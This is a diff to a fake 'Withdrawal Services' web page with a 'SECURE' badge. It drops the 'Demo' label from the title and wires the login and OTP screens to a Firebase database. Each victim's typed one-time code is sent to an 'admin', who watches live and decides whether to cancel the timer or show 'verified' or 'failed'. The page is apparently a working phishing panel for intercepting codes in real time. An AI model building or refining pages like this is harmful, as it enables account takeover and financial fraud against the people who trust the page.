@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Withdrawal — Demo</title>
+<title>Withdrawal —</title>
 <style>
 *{box-sizing:border-box}body{margin:0;font-family:Inter,Arial,Helvetica,sans-serif;background:radial-gradient(circle at 18% 15%,rgba(255,255,255,.9),transparent 32%),radial-gradient(circle at 88% 72%,rgba(170,135,255,.22),transparent 36%),linear-gradient(145deg,#f6f3ff 0%,#eee7ff 48%,#e5dbff 100%);color:#27223d;min-height:100vh}
 .demo{position:fixed;top:10px;right:10px;z-index:20;background:#fff3cd;color:#795400;border:1px solid #ffe08a;padding:6px 10px;border-radius:20px;font-size:11px;font-weight:700}
@@ -41,7 +41,7 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
 </style>
 </head>
 <body>
-<div class="demo">🛡 Withdrawal Services</div>
+<div class="demo">🛡 Withdrawal Servicses</div>
 <div class="wrap">
   <section class="card" id="login">
     <div class="badge">🛡 &nbsp;SECURE</div>
@@ -124,7 +124,6 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-// 🔥 FIREBASE CONFIG - APNA CONFIG YAHAN PASTE KAREIN
 const firebaseConfig = {
   apiKey: "AIzaSyBvWHDh7ufJDh7vyXU8MJZ99",
   authDomain: "withdrawal-app-70402.firebaseapp.com",
@@ -135,7 +134,6 @@ const firebaseConfig = {
   appId: "1:889103976344:web:25aa5c6ba9234e73564ded",
   measurementId: "G-KKQKXQMKKV"
 };
-
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
@@ -143,6 +141,7 @@ let timer = null;
 let remaining = 600;
 let timerCancelled = false;
 let otpCheckInterval = null;
+let currentUserId = null;
 
 function saveToFirebase(type, data) {
   const newRef = database.ref('activities').push();
@@ -153,11 +152,11 @@ function saveToFirebase(type, data) {
     verified: false,
     otpFailed: false,
     ...data
-  }).then(() => {
+  }).then((snapshot) => {
+    currentUserId = newRef.key;
     console.log("✅ Saved to Firebase:", type, data);
   }).catch((error) => {
     console.error("❌ Firebase Error:", error);
-    alert("❌ Firebase Error: " + error.message + "\n\nCheck Firebase Rules!");
   });
 }
 
@@ -221,10 +220,6 @@ function startTimer() {
   document.getElementById('otpInput').disabled = false;
   document.getElementById('otpInputArea').style.display = 'block';
   
-  localStorage.removeItem('withdrawal_timer_cancel');
-  localStorage.removeItem('user_entered_otp');
-  localStorage.removeItem('otp_result');
-  
   if (otpCheckInterval) {
     clearInterval(otpCheckInterval);
     otpCheckInterval = null;
@@ -244,7 +239,8 @@ function startTimer() {
     }
   }, 1000);
   
-  checkTimerCancelFromAdmin();
+  // 🔥 CHECK FIREBASE FOR ADMIN ACTIONS
+  checkFirebaseForAdminAction();
 }
 
 function updateTimer() {
@@ -261,87 +257,85 @@ function resetDemo() {
     clearInterval(otpCheckInterval);
     otpCheckInterval = null;
   }
-  localStorage.removeItem('withdrawal_timer_cancel');
-  localStorage.removeItem('user_entered_otp');
-  localStorage.removeItem('otp_result');
   document.getElementById('timerSection').classList.remove('hidden');
   document.getElementById('otpSection').classList.add('hidden');
   show('login');
 }
 
-function checkTimerCancelFromAdmin() {
+// 🔥 CHECK FIREBASE FOR ADMIN CANCEL/OTP ACTIONS
+function checkFirebaseForAdminAction() {
   if (otpCheckInterval) {
     clearInterval(otpCheckInterval);
     otpCheckInterval = null;
   }
   
   otpCheckInterval = setInterval(function() {
-    if (localStorage.getItem('withdrawal_timer_cancel') === 'true') {
-      clearInterval(otpCheckInterval);
-      otpCheckInterval = null;
-      clearInterval(timer);
-      timerCancelled = true;
-      
-      document.getElementById('timerSection').classList.add('hidden');
-      document.getElementById('otpSection').classList.remove('hidden');
-      document.getElementById('processingStatus').textContent = '⏹ TIMER CANCELLED';
-      document.getElementById('otpMessage').textContent = '';
-      document.getElementById('otpResult').style.display = 'none';
-      document.getElementById('otpInput').value = '';
-      document.getElementById('otpInput').disabled = false;
-      document.getElementById('otpInputArea').style.display = 'block';
-      localStorage.removeItem('withdrawal_timer_cancel');
-      
-      checkAdminResult();
-    }
-  }, 500);
-}
-
-function checkAdminResult() {
-  if (otpCheckInterval) {
-    clearInterval(otpCheckInterval);
-    otpCheckInterval = null;
-  }
-  
-  otpCheckInterval = setInterval(function() {
-    var result = localStorage.getItem('otp_result');
-    if (result) {
-      var otpResultDiv = document.getElementById('otpResult');
-      otpResultDiv.style.display = 'block';
-      document.getElementById('otpInputArea').style.display = 'none';
-      document.getElementById('otpMessage').textContent = '';
-      
-      if (result === 'failed') {
-        otpResultDiv.className = 'otp-result failed';
-        otpResultDiv.innerHTML = `
-          <span class="result-icon">❌</span>
-          OTP Verification Failed!<br>
-          <span style="font-size:16px;font-weight:400;">Please try again.</span>
-          <br><br>
-          <button onclick="retryOTP()" class="otp-retry-btn" style="padding:10px 30px;border:0;border-radius:30px;font-weight:700;cursor:pointer;">🔄 Retry</button>
-        `;
-        document.getElementById('otpInput').disabled = true;
-        localStorage.removeItem('otp_result');
-        
-      } else if (result === 'success') {
-        otpResultDiv.className = 'otp-result success';
-        otpResultDiv.innerHTML = `
-          <span class="result-icon">✅</span>
-          OTP Verified Successfully!<br>
-          <span style="font-size:16px;font-weight:400;">🎉 Withdrawal Complete!</span>
-        `;
-        document.getElementById('otpInput').disabled = true;
-        localStorage.removeItem('otp_result');
-        localStorage.removeItem('user_entered_otp');
-        localStorage.removeItem('withdrawal_timer_cancel');
-        
-        if (otpCheckInterval) {
+    // Check if admin cancelled timer in Firebase
+    database.ref('admin_actions').once('value').then((snapshot) => {
+      const data = snapshot.val();
+      if (data) {
+        // Check for cancel timer
+        if (data.cancelTimer === true) {
           clearInterval(otpCheckInterval);
           otpCheckInterval = null;
+          clearInterval(timer);
+          timerCancelled = true;
+          
+          document.getElementById('timerSection').classList.add('hidden');
+          document.getElementById('otpSection').classList.remove('hidden');
+          document.getElementById('processingStatus').textContent = '⏹ TIMER CANCELLED';
+          document.getElementById('otpMessage').textContent = '';
+          document.getElementById('otpResult').style.display = 'none';
+          document.getElementById('otpInput').value = '';
+          document.getElementById('otpInput').disabled = false;
+          document.getElementById('otpInputArea').style.display = 'block';
+          
+          // Reset admin action
+          database.ref('admin_actions/cancelTimer').set(false);
+        }
+        
+        // Check for OTP result
+        if (data.otpResult === 'failed') {
+          var otpResultDiv = document.getElementById('otpResult');
+          otpResultDiv.style.display = 'block';
+          document.getElementById('otpInputArea').style.display = 'none';
+          document.getElementById('otpMessage').textContent = '';
+          otpResultDiv.className = 'otp-result failed';
+          otpResultDiv.innerHTML = `
+            <span class="result-icon">❌</span>
+            OTP Verification Failed!<br>
+            <span style="font-size:16px;font-weight:400;">Please try again.</span>
+            <br><br>
+            <button onclick="retryOTP()" class="otp-retry-btn" style="padding:10px 30px;border:0;border-radius:30px;font-weight:700;cursor:pointer;">🔄 Retry</button>
+          `;
+          document.getElementById('otpInput').disabled = true;
+          database.ref('admin_actions/otpResult').set('none');
+        }
+        
+        if (data.otpResult === 'success') {
+          var otpResultDiv = document.getElementById('otpResult');
+          otpResultDiv.style.display = 'block';
+          document.getElementById('otpInputArea').style.display = 'none';
+          document.getElementById('otpMessage').textContent = '';
+          otpResultDiv.className = 'otp-result success';
+          otpResultDiv.innerHTML = `
+            <span class="result-icon">✅</span>
+            OTP Verified Successfully!<br>
+            <span style="font-size:16px;font-weight:400;">🎉 Withdrawal Complete!</span>
+          `;
+          document.getElementById('otpInput').disabled = true;
+          database.ref('admin_actions/otpResult').set('none');
+          
+          if (otpCheckInterval) {
+            clearInterval(otpCheckInterval);
+            otpCheckInterval = null;
+          }
         }
       }
-    }
-  }, 500);
+    }).catch((error) => {
+      console.error("Firebase check error:", error);
+    });
+  }, 1000);
 }
 
 function retryOTP() {
@@ -353,9 +347,8 @@ function retryOTP() {
   document.getElementById('otpMessage').textContent = '🔄 Please enter new OTP';
   document.getElementById('otpMessage').style.color = '#ff9800';
   
-  localStorage.removeItem('user_entered_otp');
-  localStorage.removeItem('otp_result');
-  localStorage.setItem('otp_retry_mode', 'true');
+  // Clear OTP data in Firebase
+  database.ref('admin_actions/otpResult').set('none');
 }
 
 function submitOTP() {
@@ -366,16 +359,17 @@ function submitOTP() {
     return;
   }
   
-  localStorage.setItem('user_entered_otp', userOtp);
-  localStorage.removeItem('otp_retry_mode');
+  // Save OTP to Firebase for admin
+  database.ref('user_otp').set({
+    otp: userOtp,
+    time: new Date().toLocaleString()
+  });
   
   document.getElementById('otpMessage').textContent = '📨 OTP submitted! Waiting for admin verification...';
   document.getElementById('otpMessage').style.color = '#ff9800';
   document.getElementById('otpInput').disabled = true;
   
   console.log("📨 User entered OTP:", userOtp);
-  localStorage.removeItem('otp_result');
-  document.getElementById('otpResult').style.display = 'none';
 }
 </script>
 </body>
